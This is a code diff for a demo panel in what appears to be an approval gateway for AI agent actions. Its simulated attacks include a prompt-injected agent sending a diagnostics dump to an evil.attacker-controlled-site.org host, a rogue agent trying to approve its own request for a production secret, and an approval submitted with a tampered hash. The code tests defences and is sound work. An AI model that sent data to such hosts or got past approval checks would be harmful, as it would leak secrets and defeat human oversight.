@@ -19,21 +19,59 @@ export const DemoScenariosBar: React.FC<DemoScenariosBarProps> = ({
     setTimeout(() => setBanner(null), 8000);
   };
 
+interface ApiResponse {
+  id?: string;
+  status?: string;
+  parametersHash?: string;
+  error?: {
+    code?: string;
+    message?: string;
+  };
+  rawText?: string;
+  [key: string]: unknown;
+}
+
+  const postJson = async (
+    url: string,
+    body: Record<string, unknown>,
+    authGuardianId?: string
+  ): Promise<{ ok: boolean; status: number; data: ApiResponse }> => {
+    const headers: Record<string, string> = { 'Content-Type': 'application/json' };
+    if (authGuardianId) {
+      headers['Authorization'] = `Bearer mock-token-${authGuardianId}`;
+    }
+    const res = await fetch(url, {
+      method: 'POST',
+      headers,
+      body: JSON.stringify(body),
+    });
+    const text = await res.text();
+    let data: ApiResponse = {};
+    if (text) {
+      try {
+        data = JSON.parse(text) as ApiResponse;
+      } catch {
+        data = { rawText: text };
+      }
+    }
+    return { ok: res.ok, status: res.status, data };
+  };
+
   // Scenario 2: Legitimate Deploy Request
   const runScenario2 = async () => {
     setLoadingScenario(2);
     try {
-      const res = await fetch('/actions', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tool: 'request_deploy',
-          parameters: { version: '1.4.2', commit: 'c0ffee1b4d89a234' },
-          proposer: { userId: 'engineer-alice', agent: 'Claude-Code-Agent-v1' },
-          source: { kind: 'github-pr', reference: 'https://github.com/org/sample-repo/pull/42' },
-        }),
+      const { ok, status, data } = await postJson('/actions', {
+        tool: 'request_deploy',
+        parameters: { version: '1.4.2', commit: 'c0ffee1b4d89a234' },
+        proposer: { userId: 'engineer-alice', agent: 'Claude-Code-Agent-v1' },
+        source: { kind: 'github-pr', reference: 'https://github.com/org/sample-repo/pull/42' },
       });
-      const data = await res.json();
+
+      if (!ok) {
+        throw new Error(data.error?.message ?? `Gateway returned HTTP ${status}`);
+      }
+
       await onRefresh();
       if (data.id) onSelectAction(data.id);
       showBanner(
@@ -51,20 +89,20 @@ export const DemoScenariosBar: React.FC<DemoScenariosBarProps> = ({
   const runScenario3 = async () => {
     setLoadingScenario(3);
     try {
-      const res = await fetch('/actions', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tool: 'request_send_external',
-          parameters: {
-            destination: 'http://evil.attacker-controlled-site.org/collect',
-            payload_ref: 'diagnostics_dump',
-          },
-          proposer: { userId: 'injected-agent', agent: 'Compromised-Claude-Agent' },
-          source: { kind: 'github-issue', reference: 'mock-env/fixtures/malicious-issue.md' },
-        }),
+      const { ok, status, data } = await postJson('/actions', {
+        tool: 'request_send_external',
+        parameters: {
+          destination: 'http://evil.attacker-controlled-site.org/collect',
+          payload_ref: 'diagnostics_dump',
+        },
+        proposer: { userId: 'injected-agent', agent: 'Compromised-Claude-Agent' },
+        source: { kind: 'github-issue', reference: 'mock-env/fixtures/malicious-issue.md' },
       });
-      const data = await res.json();
+
+      if (!ok) {
+        throw new Error(data.error?.message ?? `Gateway returned HTTP ${status}`);
+      }
+
       await onRefresh();
       if (data.id) onSelectAction(data.id);
       showBanner(
@@ -82,46 +120,43 @@ export const DemoScenariosBar: React.FC<DemoScenariosBarProps> = ({
   const runScenario4 = async () => {
     setLoadingScenario(4);
     try {
-      // Create request where proposer is current guardian
-      const res = await fetch('/actions', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tool: 'request_use_secret',
-          parameters: {
-            secret_name: 'PROD_DB_MIGRATION_TOKEN',
-            purpose: 'Unauthorized self-probe for database migration credentials',
-          },
-          proposer: { userId: currentGuardian, agent: 'Rogue-Agent' },
-          source: { kind: 'direct', reference: 'compromised-cli-session' },
-        }),
-      });
-      const data = await res.json();
-
-      // Now attempt self-approval
-      const approveRes = await fetch(`/actions/${data.id}/approve`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          Authorization: `Bearer mock-token-${currentGuardian}`,
+      // 1. Create request where proposer is current guardian
+      const createRes = await postJson('/actions', {
+        tool: 'request_use_secret',
+        parameters: {
+          secret_name: 'PROD_DB_MIGRATION_TOKEN',
+          purpose: 'Unauthorized self-probe for database migration credentials',
         },
-        body: JSON.stringify({
-          guardianId: currentGuardian,
-          parametersHash: data.parametersHash,
-        }),
+        proposer: { userId: currentGuardian, agent: 'Rogue-Agent' },
+        source: { kind: 'direct', reference: 'compromised-cli-session' },
       });
-      const approveData = await approveRes.json();
+
+      if (!createRes.ok) {
+        throw new Error(
+          createRes.data.error?.message ?? `Failed to create action (HTTP ${createRes.status})`
+        );
+      }
+
+      // 2. Now attempt self-approval
+      const approveRes = await postJson(
+        `/actions/${createRes.data.id}/approve`,
+        {
+          guardianId: currentGuardian,
+          parametersHash: createRes.data.parametersHash,
+        },
+        currentGuardian
+      );
 
       await onRefresh();
-      if (data.id) onSelectAction(data.id);
+      if (createRes.data.id) onSelectAction(createRes.data.id);
 
-      if (approveData.error?.code === 'SELF_APPROVAL') {
+      if (approveRes.data.error?.code === 'SELF_APPROVAL') {
         showBanner(
           `🛑 Scenario 4 Attack Blocked! Proposer (${currentGuardian}) attempted to self-approve: Gateway rejected with [SELF_APPROVAL 409]. Four-Eyes principle held!`,
           'warning'
         );
       } else {
-        showBanner(`Created self-approval test request ${data.id}`, 'warning');
+        showBanner(`Created self-approval test request ${createRes.data.id}`, 'warning');
       }
     } catch (err: unknown) {
       showBanner(`Failed to trigger scenario: ${(err as Error).message}`, 'danger');
@@ -135,51 +170,45 @@ export const DemoScenariosBar: React.FC<DemoScenariosBarProps> = ({
     setLoadingScenario(5);
     try {
       // 1. Create legit deploy request
-      const res = await fetch('/actions', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tool: 'request_deploy',
-          parameters: { version: '1.4.2', commit: 'a1b2c3d4e5f60000' },
-          proposer: { userId: 'engineer-alice', agent: 'Claude-Code-Agent-v1' },
-          source: { kind: 'github-pr', reference: 'https://github.com/org/sample-repo/pull/55' },
-        }),
+      const createRes = await postJson('/actions', {
+        tool: 'request_deploy',
+        parameters: { version: '1.4.2', commit: 'a1b2c3d4e5f60000' },
+        proposer: { userId: 'engineer-alice', agent: 'Claude-Code-Agent-v1' },
+        source: { kind: 'github-pr', reference: 'https://github.com/org/sample-repo/pull/55' },
       });
-      const data = await res.json();
+
+      if (!createRes.ok) {
+        throw new Error(
+          createRes.data.error?.message ?? `Failed to create action (HTTP ${createRes.status})`
+        );
+      }
 
       // 2. Guardian 1 approves legitimate hash
-      await fetch(`/actions/${data.id}/approve`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          Authorization: 'Bearer mock-token-guardian-alice',
-        },
-        body: JSON.stringify({
+      await postJson(
+        `/actions/${createRes.data.id}/approve`,
+        {
           guardianId: 'guardian-alice',
-          parametersHash: data.parametersHash,
-        }),
-      });
+          parametersHash: createRes.data.parametersHash,
+        },
+        'guardian-alice'
+      );
 
       // 3. Attacker submits approval with tampered hash
-      const tamperedRes = await fetch(`/actions/${data.id}/approve`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          Authorization: 'Bearer mock-token-guardian-bob',
-        },
-        body: JSON.stringify({
+      const tamperedRes = await postJson(
+        `/actions/${createRes.data.id}/approve`,
+        {
           guardianId: 'guardian-bob',
           parametersHash: 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
-        }),
-      });
-      const tamperedData = await tamperedRes.json();
+        },
+        'guardian-bob'
+      );
 
       await onRefresh();
-      if (data.id) onSelectAction(data.id);
+      if (createRes.data.id) onSelectAction(createRes.data.id);
 
-      if (tamperedData.error?.code === 'HASH_MISMATCH') {
+      if (tamperedRes.data.error?.code === 'HASH_MISMATCH') {
         showBanner(
-          `🔀 Scenario 5 Attack Blocked! Attacker tampered with parameters hash: Gateway detected mismatch and halted execution with [HASH_MISMATCH 422]!`,
+          `🔀 Scenario 5 Attack Blocked! Attacker tampered with parameters hash: Gateway detected mismatch and halted execution with [HASH_MISMATCH 409]!`,
           'warning'
         );
       } else {
